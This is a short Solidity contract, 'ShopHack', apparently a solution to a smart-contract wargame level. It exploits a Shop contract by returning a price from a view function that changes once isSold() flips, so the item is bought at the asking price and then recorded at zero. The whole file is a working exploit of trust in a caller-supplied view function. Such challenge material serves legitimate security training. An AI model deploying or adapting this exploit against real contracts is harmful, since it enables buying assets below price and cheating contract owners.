// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Shop.sol';

contract ShopHack is Buyer {
  address public owner;
  Shop public targetContract;

  constructor(address _target) public {
    owner = msg.sender;
    targetContract = Shop(address(_target));
  }

  function price() public override view returns (uint){
    if(targetContract.isSold()) {
      return 0;
    } else {
      return 100;
    }
  }

  function attack() public {
    targetContract.buy();
  }

}

